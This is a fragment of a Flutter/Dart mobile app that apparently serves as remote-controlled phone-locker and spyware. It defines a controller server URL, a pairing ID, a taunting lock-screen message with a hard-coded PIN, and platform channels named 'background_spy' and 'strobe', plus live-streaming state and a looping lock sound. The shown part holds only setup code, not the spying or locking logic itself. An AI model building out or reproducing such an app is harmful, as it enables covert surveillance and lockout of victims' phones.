import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:audioplayers/audioplayers.dart';

const String kServerBase = "https://voidhand-api.vercel.app";
const String kPairId = "CC36C217274DC965";

ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
late AudioPlayer _audioPlayer;
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!! BY HANZ DEPLONGER";
String currentLockPIN = "1234";

final lockChatMessages = ValueNotifier<List<Map<String, String>>>([]);
bool isLockLive = false;

const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

bool _isLiveStreaming = false;
Timer? _liveStreamTimer;

void playLockSound() async {
  try {
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.play(AssetSource('lock.mp3'));
  } catch (e) {}
}

void stopSound() async {
  try {
    await _audioPlayer.stop();
  } catch (_) {}
}
